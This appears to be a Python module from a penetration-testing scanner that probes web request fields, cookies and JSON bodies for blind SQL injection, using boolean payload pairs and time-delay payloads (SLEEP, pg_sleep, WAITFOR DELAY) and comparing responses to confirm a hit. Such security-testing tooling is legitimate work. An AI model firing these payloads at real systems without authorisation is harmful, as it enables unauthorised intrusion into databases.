"""Differential (blind) SQLi: boolean-based and time-based prober modules."""

from __future__ import annotations

import time

from penpine.attack.models import Confidence, Finding, Payload
from penpine.attack.types import AttackType

_SQLI_KINDS = ("param", "form", "json", "multipart", "cookie")


class DifferentialModule:
    """An active prober: drives its own sends and returns a Finding or None."""

    name = "differential"
    applies_to: tuple = ()
    attack_type = None

    def applies(self, kind: str) -> bool:
        return not self.applies_to or kind in self.applies_to

    async def probe(self, point, request, sender, *, baseline=None):
        raise NotImplementedError


def _similar(a, b, *, tolerance) -> bool:
    if a is None or b is None:
        return False
    if a.status_code != b.status_code:
        return False
    return abs(len(a.body.raw) - len(b.body.raw)) <= tolerance


BOOLEAN_PAYLOAD_PAIRS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1", " AND 1=2"),
    (") AND 1=1-- -", ") AND 1=2-- -"),
]


class BooleanSqliModule(DifferentialModule):
    name = "sqli-boolean"
    attack_type = AttackType.SQLI
    applies_to = _SQLI_KINDS

    def __init__(self, pairs=None):
        self.pairs = list(pairs) if pairs is not None else list(BOOLEAN_PAYLOAD_PAIRS)

    async def probe(self, point, request, sender, *, baseline=None):
        base = baseline if baseline is not None else await sender.send(request)
        tolerance = max(32, len(base.body.raw) // 20)
        for true_payload, false_payload in self.pairs:
            rt = await sender.send(request.replace_at(point.expr, true_payload))
            rf = await sender.send(request.replace_at(point.expr, false_payload))
            if _similar(rt, base, tolerance=tolerance) and not _similar(
                rf, base, tolerance=tolerance
            ):
                return Finding(
                    attack_type=AttackType.SQLI,
                    point=point,
                    payload=Payload(true_payload, technique="boolean-blind"),
                    confidence=Confidence.HIGH,
                    evidence=(
                        f"boolean-based blind SQLi: TRUE ({true_payload!r}) matched baseline, "
                        f"FALSE ({false_payload!r}) differed"
                    ),
                    request=request.replace_at(point.expr, true_payload),
                    response=rt,
                )
        return None


BOOLEAN_SQLI_MODULE = BooleanSqliModule()


TIME_PAYLOAD_TEMPLATES = [
    "' AND SLEEP({n})-- -",
    " AND SLEEP({n})",
    "' AND (SELECT 1 FROM (SELECT SLEEP({n}))x)-- -",
    "' AND pg_sleep({n})-- -",
    "';SELECT pg_sleep({n})-- -",
    "'; WAITFOR DELAY '0:0:{n}'-- -",
    " WAITFOR DELAY '0:0:{n}'",
]


class TimeSqliModule(DifferentialModule):
    name = "sqli-time"
    attack_type = AttackType.SQLI
    applies_to = _SQLI_KINDS

    def __init__(self, *, templates=None, delay=3, threshold=0.8, clock=time.perf_counter):
        self.templates = list(templates) if templates is not None else list(TIME_PAYLOAD_TEMPLATES)
        self.delay = delay
        self.threshold = threshold
        self._clock = clock

    async def _timed(self, sender, req):
        start = self._clock()
        resp = await sender.send(req)
        return self._clock() - start, resp

    async def probe(self, point, request, sender, *, baseline=None):
        margin = self.delay * self.threshold
        b1, _ = await self._timed(sender, request)
        b2, _ = await self._timed(sender, request)
        base_lat = min(b1, b2)
        for template in self.templates:
            payload = template.format(n=self.delay)
            t1, resp = await self._timed(sender, request.replace_at(point.expr, payload))
            if t1 - base_lat < margin:
                continue
            t2, _ = await self._timed(sender, request.replace_at(point.expr, payload))
            control = template.format(n=0)
            tc, _ = await self._timed(sender, request.replace_at(point.expr, control))
            if t2 - base_lat >= margin and tc - base_lat < margin:
                return Finding(
                    attack_type=AttackType.SQLI,
                    point=point,
                    payload=Payload(payload, technique="time-blind"),
                    confidence=Confidence.HIGH,
                    evidence=(
                        f"time-based blind SQLi: {payload!r} delayed ~{t1 - base_lat:.1f}s "
                        f"(confirmed {t2 - base_lat:.1f}s), control fast"
                    ),
                    request=request.replace_at(point.expr, payload),
                    response=resp,
                )
        return None


TIME_SQLI_MODULE = TimeSqliModule()
